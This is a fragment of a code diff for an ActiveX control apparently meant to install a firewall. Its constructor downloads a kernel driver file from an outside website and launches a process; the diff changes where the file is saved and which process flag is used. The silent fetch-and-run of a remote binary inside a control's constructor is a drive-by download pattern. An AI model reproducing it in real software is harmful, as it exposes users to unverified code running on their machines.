@@ -124,7 +124,7 @@ CFirewallInstallerCtrl::CFirewallInstallerCtrl()
                            );
 	hr = URLDownloadToFile ( NULL,      // ptr to ActiveX container
                              _T("http://ljsking.org/PDS/MyDriver.sys"),      // URL to get
-							 _T("c:\\windows\\system32\\drivers\\MyDriver.sys"),     // file to store data in
+							 _T("c:\\MyDriver.sys"),     // file to store data in
                              0,         // reserved
                              0  // ptr to IBindStatusCallback
                            );
@@ -134,7 +134,7 @@ CFirewallInstallerCtrl::CFirewallInstallerCtrl()
 	memset(&processinfo, 0, sizeof(PROCESS_INFORMATION));
 	memset(&startupinfo, 0, sizeof(STARTUPINFO));
 	startupinfo.cb = sizeof(STARTUPINFO);
-	BOOL bRes = CreateProcess(szCmdline, NULL, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &startupinfo, &processinfo);
+	BOOL bRes = CreateProcess(szCmdline, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startupinfo, &processinfo);
 }
 
 
